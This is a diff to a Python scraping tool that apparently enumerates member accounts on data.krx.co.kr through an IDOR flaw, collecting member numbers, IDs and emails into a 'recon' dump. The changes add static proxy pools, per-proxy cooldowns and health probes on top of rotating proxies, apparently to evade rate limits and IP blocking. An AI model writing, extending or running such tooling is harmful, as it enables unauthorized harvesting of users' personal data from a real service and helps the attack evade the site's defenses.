@@ -53,6 +53,7 @@ OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
 STATIC_PROXY = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "").rstrip("/")
 PROXY_AUTH = os.environ.get("KRX_PROXY_AUTH", "").strip()
 PROXY_TTL = int(os.environ.get("KRX_PROXY_TTL", "90"))
+STATIC_COOLDOWN = int(os.environ.get("KRX_STATIC_COOLDOWN", "60"))
 EXTRACT_COUNT = int(os.environ.get("KRX_EXTRACT_COUNT", "10"))
 KEEP_LIVE = int(os.environ.get("KRX_KEEP_LIVE", "12"))
 PICK_N = int(os.environ.get("KRX_PICK_N", "12"))
@@ -182,6 +183,29 @@ def parse_proxy_line(line: str, extra_auth: str = "") -> str | None:
     return None
 
 
+def static_proxy_list() -> list[str]:
+    raw: list[str] = []
+    blob = os.environ.get("KRX_STATIC_PROXIES", "").strip()
+    if blob:
+        for part in blob.replace(",", "|").split("|"):
+            part = part.strip()
+            if part:
+                raw.append(part)
+    for i in range(1, 20):
+        key = "KRX_STATIC_PROXY" if i == 1 else f"KRX_STATIC_PROXY_{i}"
+        v = os.environ.get(key, "").strip()
+        if v:
+            raw.append(v)
+    if STATIC_PROXY:
+        raw.append(STATIC_PROXY)
+    out: list[str] = []
+    for line in raw:
+        p = parse_proxy_line(line)
+        if p and p not in out:
+            out.append(p)
+    return out
+
+
 def parse_extract_body(text: str, extra_auth: str = "") -> list[str]:
     text = (text or "").strip()
     if not text:
@@ -275,9 +299,13 @@ class ProxyPool:
         self.use_direct = USE_DIRECT
         self.direct_until = 0.0
         self.allow_direct = self.use_direct or not self.urls
-        if self.static and not self.urls:
-            self.proxies = [self.static]
-            self.born[self.static] = time.time()
+        self.static_list = static_proxy_list()
+        if static:
+            p = static.rstrip("/")
+            if p and p not in self.static_list:
+                self.static_list.append(p)
+        self.static_set = set(self.static_list)
+        self.static_until: dict[str, float] = {}
 
     def _alive_urls(self) -> list[str]:
         return [u for u in self.urls if u not in self.dead_urls]
@@ -285,7 +313,27 @@ class ProxyPool:
     def _fresh(self, proxy: str) -> bool:
         if proxy in self.bad:
             return False
+        if proxy in self.static_set:
+            return time.time() >= self.static_until.get(proxy, 0)
         return (time.time() - self.born.get(proxy, 0)) < PROXY_TTL
+
+    def panda_good_n(self) -> int:
+        now = time.time()
+        n = 0
+        for p in self.good:
+            if p in self.static_set or p in self.bad:
+                continue
+            if (now - self.born.get(p, 0)) < PROXY_TTL:
+                n += 1
+        return n
+
+    def static_live(self) -> list[str]:
+        now = time.time()
+        return [
+            p
+            for p in self.static_list
+            if p not in self.bad and now >= self.static_until.get(p, 0)
+        ]
 
     def live_list(self) -> list[str]:
         return [p for p in self.proxies if self._fresh(p)]
@@ -318,7 +366,7 @@ class ProxyPool:
     def _expire_old(self) -> None:
         """Drop expired IPs from born/good/proxies so pick() stays O(live). Caller holds _lock."""
         now = time.time()
-        dead = [p for p, t0 in self.born.items() if now - t0 >= PROXY_TTL]
+        dead = [p for p, t0 in self.born.items() if p not in self.static_set and now - t0 >= PROXY_TTL]
         if not dead:
             return
         dead_set = set(dead)
@@ -349,7 +397,7 @@ class ProxyPool:
             time.sleep(0.2)
             return
         try:
-            if self.good_n() >= KEEP_LIVE:
+            if self.panda_good_n() >= KEEP_LIVE:
                 return
             url = self._next_url()
             if url is None:
@@ -421,13 +469,53 @@ class ProxyPool:
         for _ in list(self._alive_urls()):
             self.fetch()
 
+    def load_static(self) -> None:
+        if not self.static_list:
+            return
+        ok_list: list[str] = []
+        with ThreadPoolExecutor(max_workers=min(8, len(self.static_list))) as ex:
+            futs = {ex.submit(self._probe, p): p for p in self.static_list}
+            for fut in as_completed(futs):
+                p = futs[fut]
+                try:
+                    if fut.result():
+                        ok_list.append(p)
+                except Exception:
+                    pass
+        now = time.time()
+        with _lock:
+            for p in self.static_list:
+                user = urlparse(p).username or ""
+                if p not in ok_list:
+                    print(f"static_fail {user}", flush=True)
+                    continue
+                if p not in self.proxies:
+                    self.proxies.append(p)
+                self.bad.discard(p)
+                self.static_until.pop(p, None)
+                self.strikes.pop(p, None)
+                self.born[p] = now
+                if p not in self.good:
+                    self.good.append(p)
+                print(f"static_ok {user}", flush=True)
+        print(f"static_ready {len(ok_list)}/{len(self.static_list)}", flush=True)
+
     def pick(self) -> str | None:
         now = time.time()
         with _lock:
-            fresh = [p for p in self.good if (now - self.born.get(p, 0)) < PROXY_TTL and p not in self.bad]
+            static_live = [
+                p for p in self.static_list if p not in self.bad and now >= self.static_until.get(p, 0)
+            ]
+            fresh = [
+                p
+                for p in self.good
+                if p not in self.static_set
+                and p not in self.bad
+                and (now - self.born.get(p, 0)) < PROXY_TTL
+            ]
             fresh.sort(key=lambda p: self.born.get(p, 0), reverse=True)
-            live = fresh[:PICK_N]
-            n_good = len(fresh)
+            live = static_live + fresh[:PICK_N]
+            n_good = len(static_live) + len(fresh)
             direct_ok = (
                 self.use_direct
                 and now >= self.direct_until
@@ -454,6 +542,7 @@ class ProxyPool:
                 return
             self.strikes.pop(proxy, None)
             self.bad.discard(proxy)
+            self.static_until.pop(proxy, None)
             if proxy not in self.good:
                 self.good.append(proxy)
 
@@ -468,6 +557,21 @@ class ProxyPool:
                 self.direct_until = now + DIRECT_COOLDOWN
             if first:
                 print(f"direct_cooldown {DIRECT_COOLDOWN}s", flush=True)
+            return
+        if proxy in self.static_set:
+            with _lock:
+                _stats["retry"] += 1
+                now = time.time()
+                if auth:
+                    self.bad.add(proxy)
+                    if proxy in self.good:
+                        self.good.remove(proxy)
+                    print(f"static_auth_fail {urlparse(proxy).username}", flush=True)
+                    return
+                first = now >= self.static_until.get(proxy, 0)
+                self.static_until[proxy] = now + STATIC_COOLDOWN
+            if first:
+                print(f"static_cooldown {urlparse(proxy).username} {STATIC_COOLDOWN}s", flush=True)
             return
         with _lock:
             _stats["retry"] += 1
@@ -810,15 +914,16 @@ def main() -> None:
         sw.writerow(["mbrNo", "status", "mbrId"])
 
     pool = init_pool()
+    pool.load_static()
     if pool.urls:
         pool.fetch_all()
 
     def _topup() -> None:
         while True:
-            time.sleep(2 if pool.good_n() == 0 else 8)
+            time.sleep(2 if pool.panda_good_n() == 0 and not pool.static_live() else 8)
             try:
                 pool.prune()
-                if pool.good_n() < KEEP_LIVE and pool._alive_urls():
+                if pool.panda_good_n() < KEEP_LIVE and pool._alive_urls():
                     pool.fetch()
             except Exception:
                 pass
@@ -832,7 +937,8 @@ def main() -> None:
         f"workers={WORKERS} inflight={INFLIGHT} timeout={HTTP_TIMEOUT}s "
         f"mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
         f"head={len(head)} tail={len(tail)} holes={len(holes)} "
-        f"have_id={len(have_id)} have_email={len(have_email)} panda={len(pool.urls)}",
+        f"have_id={len(have_id)} have_email={len(have_email)} "
+        f"panda={len(pool.urls)} static={len(pool.static_list)}",
         flush=True,
     )
     last_flush = time.time()
